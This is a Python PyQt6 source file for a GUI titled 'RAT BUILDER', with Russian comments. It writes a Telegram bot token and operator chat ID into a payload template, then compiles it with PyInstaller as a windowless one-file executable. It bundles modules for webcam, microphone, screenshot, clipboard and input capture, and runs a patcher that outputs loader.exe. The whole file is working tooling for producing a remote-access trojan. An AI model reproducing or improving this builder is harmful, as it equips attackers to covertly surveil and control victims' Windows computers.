# language: Python 3.11, file: builder_gui.py, target: Windows 11
# GUI-билдер: token + chat_id -> инжект -> PyInstaller (vendor, без pip) -> patcher -> loader.exe

import os
import sys
import re
import time
import shutil
import subprocess
import tempfile
from pathlib import Path

from PyQt6.QtCore import Qt, QThread, pyqtSignal
from PyQt6.QtGui import QFont
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QLabel, QLineEdit,
    QPushButton, QProgressBar, QTextEdit, QMessageBox
)

if getattr(sys, "frozen", False):
    APP_DIR = Path(sys._MEIPASS)
else:
    APP_DIR = Path(__file__).resolve().parent

TEMPLATE = APP_DIR / "build.py"
PATCHER = APP_DIR / "patcher.py"
VENDOR = APP_DIR / "vendor"

CREATE_NO_WINDOW = getattr(subprocess, "CREATE_NO_WINDOW", 0)


class BuildWorker(QThread):
    progress = pyqtSignal(int)
    log = pyqtSignal(str)
    finished_ok = pyqtSignal(str)
    finished_err = pyqtSignal(str)

    def __init__(self, token: str, chat_id: str):
        super().__init__()
        self.token = token
        self.chat_id = chat_id

    def _stream(self, cmd, cwd, pct_start, pct_end):
        self.log.emit(f"$ {' '.join(cmd)}")
        proc = subprocess.Popen(
            cmd, cwd=str(cwd), stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1, creationflags=CREATE_NO_WINDOW,
        )
        for line in proc.stdout:
            self.log.emit(line.rstrip())
        proc.wait()
        self.progress.emit(pct_end)
        return proc.returncode

    def run(self):
        try:
            with tempfile.TemporaryDirectory(prefix="ratbuild_") as tmpdir:
                tmp = Path(tmpdir)

                # 1. подготовка
                self.progress.emit(5)
                self.log.emit("[*] Preparing workspace…")
                shutil.copy(TEMPLATE, tmp / "build.py")
                shutil.copy(PATCHER, tmp / "patcher.py")

                # 2. инжект
                self.progress.emit(10)
                src = (tmp / "build.py").read_text(encoding="utf-8")
                src, n1 = re.subn(r'BOT_TOKEN\s*=\s*"[^"]*"',
                                  f'BOT_TOKEN = "{self.token}"', src)
                src, n2 = re.subn(r'OPERATOR_ID\s*=\s*"[^"]*"',
                                  f'OPERATOR_ID = "{self.chat_id}"', src)
                if not n1 or not n2:
                    self.finished_err.emit("inject failed: placeholder not found")
                    return
                (tmp / "build.py").write_text(src, encoding="utf-8")
                self.log.emit("[*] Token & chat_id injected.")

                # 3. PyInstaller — vendor вшит, pip не вызываем
                self.progress.emit(30)
                self.log.emit("[*] PyInstaller building payload…")
                pyi_cmd = [
                    sys.executable, "-m", "PyInstaller",
                    "--onefile", "--noconsole", "--clean", "--noconfirm",
                    "--name", "build",
                ]
                if VENDOR.exists():
                    pyi_cmd += ["--paths", str(VENDOR)]
                    for mod in ("telebot", "psutil", "cv2", "sounddevice",
                                "soundfile", "PIL", "pyautogui", "pyperclip",
                                "requests", "win32api", "Crypto", "mss"):
                        pyi_cmd += ["--hidden-import", mod]
                pyi_cmd.append(str(tmp / "build.py"))

                rc = self._stream(pyi_cmd, cwd=tmp, pct_start=30, pct_end=75)
                exe = tmp / "dist" / "build.exe"
                if rc != 0 or not exe.exists():
                    self.finished_err.emit("PyInstaller failed")
                    return

                # 4. патчер
                self.progress.emit(78)
                self.log.emit("[*] Applying patcher…")
                rc = self._stream(
                    [sys.executable, str(tmp / "patcher.py"), str(exe)],
                    cwd=tmp, pct_start=78, pct_end=94,
                )
                loader = exe.parent / "loader.exe"
                if rc != 0 or not loader.exists():
                    self.finished_err.emit("patcher failed")
                    return

                # 5. вынос артефакта
                self.progress.emit(97)
                out_dir = Path(os.path.expanduser("~")) / "rat_builder_output"
                out_dir.mkdir(parents=True, exist_ok=True)
                out = out_dir / "loader.exe"
                if out.exists():
                    try:
                        out.unlink()
                    except PermissionError:
                        out = out_dir / f"loader_{int(time.time())}.exe"
                shutil.copy(loader, out)
                self.progress.emit(100)
                self.log.emit(f"[+] Done: {out}")
                self.finished_ok.emit(str(out))

        except Exception as e:
            self.finished_err.emit(f"{type(e).__name__}: {e}")


class BuilderWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("RAT BUILDER")
        self.resize(680, 560)
        self.setStyleSheet("""
            QMainWindow { background:#111; }
            QLabel { color:#eee; font-size:13px; }
            QLineEdit { background:#1c1c1c; color:#eee; border:1px solid #333;
                        padding:6px; border-radius:4px; font-size:13px; }
            QPushButton { background:#c0392b; color:#fff; border:none;
                          padding:10px; border-radius:4px; font-weight:bold; }
            QPushButton:hover { background:#e74c3c; }
            QPushButton:disabled { background:#555; }
            QProgressBar { background:#1c1c1c; border:1px solid #333;
                           border-radius:4px; text-align:center; color:#eee; height:22px; }
            QProgressBar::chunk { background:#c0392b; }
            QTextEdit { background:#0a0a0a; color:#7f7; border:1px solid #222;
                        font-family:Consolas,monospace; font-size:12px; }
        """)

        root = QWidget()
        self.setCentralWidget(root)
        lay = QVBoxLayout(root)
        lay.setContentsMargins(24, 24, 24, 24)
        lay.setSpacing(10)

        title = QLabel("RAT BUILDER")
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title.setFont(QFont("Segoe UI", 24, QFont.Weight.Bold))
        lay.addWidget(title)

        lay.addWidget(QLabel("Bot token:"))
        self.token_edit = QLineEdit()
        self.token_edit.setPlaceholderText("123456789:AA...")
        lay.addWidget(self.token_edit)

        lay.addWidget(QLabel("Chat ID:"))
        self.chat_edit = QLineEdit()
        self.chat_edit.setPlaceholderText("123456789")
        lay.addWidget(self.chat_edit)

        self.build_btn = QPushButton("Собрать")
        self.build_btn.clicked.connect(self.on_build)
        lay.addWidget(self.build_btn)

        self.progress = QProgressBar()
        self.progress.setRange(0, 100)
        lay.addWidget(self.progress)

        self.log_view = QTextEdit()
        self.log_view.setReadOnly(True)
        lay.addWidget(self.log_view, stretch=1)

        self.worker = None

    def on_build(self):
        token = self.token_edit.text().strip().strip("<>").strip()
        chat = self.chat_edit.text().strip().strip("<>").strip()

        if not token or ":" not in token:
            QMessageBox.warning(self, "Ошибка", "Введите корректный Bot token.")
            return
        if not chat.lstrip("-").isdigit():
            QMessageBox.warning(self, "Ошибка", "Chat ID должен быть числом.")
            return

        self.build_btn.setEnabled(False)
        self.build_btn.setText("Сборка…")
        self.progress.setValue(0)
        self.log_view.clear()

        self.worker = BuildWorker(token, chat)
        self.worker.progress.connect(self.progress.setValue)
        self.worker.log.connect(self.log_view.append)
        self.worker.finished_ok.connect(self.on_ok)
        self.worker.finished_err.connect(self.on_err)
        self.worker.finished.connect(self._cleanup_worker)
        self.worker.start()

    def _cleanup_worker(self):
        if self.worker:
            self.worker.deleteLater()
            self.worker = None

    def on_ok(self, path):
        self.build_btn.setEnabled(True)
        self.build_btn.setText("Собрать")
        QMessageBox.information(self, "Готово", f"Сборка завершена:\n{path}")

    def on_err(self, msg):
        self.build_btn.setEnabled(True)
        self.build_btn.setText("Собрать")
        QMessageBox.critical(self, "Ошибка сборки", msg)


if __name__ == "__main__":
    app = QApplication(sys.argv)
    w = BuilderWindow()
    w.show()
    sys.exit(app.exec())
